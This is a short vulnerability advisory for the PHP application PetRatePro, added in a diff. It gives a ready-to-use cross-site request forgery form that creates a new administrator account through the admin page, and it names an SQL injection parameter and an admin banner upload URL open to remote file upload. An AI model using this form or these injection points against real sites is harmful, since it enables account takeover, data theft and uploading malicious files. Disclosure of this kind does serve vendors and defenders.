@@ -1,0 +1,19 @@
+1. Cross-Site Request Forgery:
+
+<form name="myform" method="post" action="http://www.example.com/PetRatePro/admin/createnewadmin.php" onsubmit="javascript: return checkifvalid();">
+(Create New Administrator)
+Username
+<input name="username" type="text" id="name" size="20">
+Password<input name="upassword" type="text" id="upassword" size="20">
+Name<input name="name1" type="text" id="name1" size="20">
+Email Address <input name="email" type="text" id="email" size="20">
+<input type="submit" value="Create " name="B1">
+</form>
+ 
+2. SQL Injection:
+
+http://www.example.com/PetRatePro/viewcomments.php?phid=[SQLi]
+
+3. Remote File Upload
+
+http://www.example.com/PetRatePro/admin/sitebanners/upload_banners.php
